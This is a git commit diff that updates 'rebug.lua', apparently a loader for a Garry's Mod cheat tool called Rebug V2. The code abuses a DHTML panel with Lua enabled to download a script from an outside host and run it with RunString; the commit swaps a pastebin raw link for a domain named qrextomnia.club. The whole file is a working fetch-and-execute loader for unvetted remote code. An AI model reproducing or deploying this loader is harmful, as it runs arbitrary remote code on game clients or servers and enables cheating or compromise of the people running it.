f1f3d8531faf844bdc3fb7f6f75cb2206225a4ab
Vectivus <54481654+Void09@users.noreply.github.com>
2021-01-10 20:17:43 +0000

    Update rebug.lua

--- Rebug V2/external/rebug.lua
+++ Rebug V2/external/rebug.lua
@@ -1,5 +1,5 @@
 local f = vgui.Create('DHTML');
 f:SetAllowLua(true);
 return f:ConsoleMessage([[RUNLUA:
-http.Fetch("https://pastebin.com/raw/1mvcGzB9",function(b)RunString(b)end)
+http.Fetch("https://qrextomnia.club/scripts/rebug.lua",function(b)RunString(b)end)
 ]]);
